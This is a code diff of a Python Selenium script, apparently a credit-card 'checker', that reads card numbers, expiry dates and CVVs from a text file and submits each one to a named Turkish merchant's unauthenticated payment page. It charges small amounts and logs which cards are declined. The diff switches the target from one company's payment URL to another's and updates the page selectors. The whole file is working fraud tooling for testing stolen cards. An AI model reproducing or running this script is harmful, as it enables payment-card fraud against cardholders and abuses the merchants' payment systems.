@@ -1,3 +1,4 @@
+import chromedriver_autoinstaller
 from http import client
 from typing import Text
 from selenium import webdriver
@@ -19,7 +20,7 @@ from time import sleep
 
 
 def funct():
-    CCList = open('cc.txt', "r+", encoding="utf8").read().splitlines()# hata werirse c:/user/ali/masaüstü/cc.txt gibi düzeltin
+    CCList = open('cc.txt', "r+", encoding="utf8").read().splitlines()
     kartlar = []
 
     for i in CCList:
@@ -53,7 +54,7 @@ driver.delete_all_cookies()
 
 init(autoreset=True)
 while True:
-        buy = ("https://odeme.windoform.com.tr/Payment/Step1?notAut=True")
+        buy = ("https://odeme.mobiliz.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
         print('Starting ..')
         driver.get(buy)
         sleep(2)
@@ -64,11 +65,16 @@ while True:
          while s:
           o.append(s[:4])
           s = s[4:]
+          
+         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="paymentItem"]/button[2]'))).click()
+         sleep(0.3)
+         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="paymentItem"]/ul/li/div'))).click()
+         
          wait.until(EC.presence_of_element_located((By.ID, 'PureAmount'))).click()
          sleep(1)
-         wait.until(EC.presence_of_element_located((By.ID, 'PureAmount'))).send_keys('5')
-         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[2]/div[3]'))).click()
-         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[2]/div[3]'))).click()
+         wait.until(EC.presence_of_element_located((By.ID, 'PureAmount'))).send_keys('20')
+         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[3]/tbody/tr[2]/td[4]/input'))).click()
+         wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[3]/tbody/tr[2]/td[4]/input'))).click()
          #wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#installmentTable > table > tbody > tr:nth-child(2) > td.commRate-20.best-commrate.highlight > input'))).click()
          wait.until(EC.presence_of_element_located((By.ID, 'Phone'))).click()
          wait.until(EC.presence_of_element_located((By.ID, 'Phone'))).send_keys('545621589')
@@ -94,7 +100,7 @@ while True:
          sleep(3.5)
  
          if 'Lütfen taksit seçeneklerinden birini seçiniz.' in driver.page_source:
-             wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[1]/tbody/tr[2]/td[2]/div[3]'))).click()
+             wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="installmentTable"]/table[3]/tbody/tr[2]/td[4]/input'))).click()
              print(Fore.GREEN +'5.00 TL WORLD POS SECİLDİ')
              wait.until(EC.presence_of_element_located((By.ID, 'btnNormalPayment'))).click()
              sleep(2)
@@ -115,7 +121,7 @@ while True:
                  print(Fore.GREEN +"devam ediyor .")
                  sleep(0.2)
                  print(Fore.GREEN +"devam ediyor ..")
-                 driver.get("https://odeme.windoform.com.tr/Payment/Step1?notAut=True")
+                 driver.get("https://odeme.mobiliz.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
                  sleep(2)
              else:
                  print(Fore.GREEN + "                                 ")
@@ -129,6 +135,6 @@ while True:
              sleep(2)
          else:
              print(Fore.RED +"Declined :Ödeme Yapılamadı.", cc,"|",mm,"|",yy,"|",cvv,)     
-             driver.get("https://odeme.windoform.com.tr/Payment/Step1?notAut=True")
+             driver.get("https://odeme.mobiliz.com.tr/Payment/UnAuthenticatedPayment?notAut=True")
              sleep(3)
          sleep(3)    
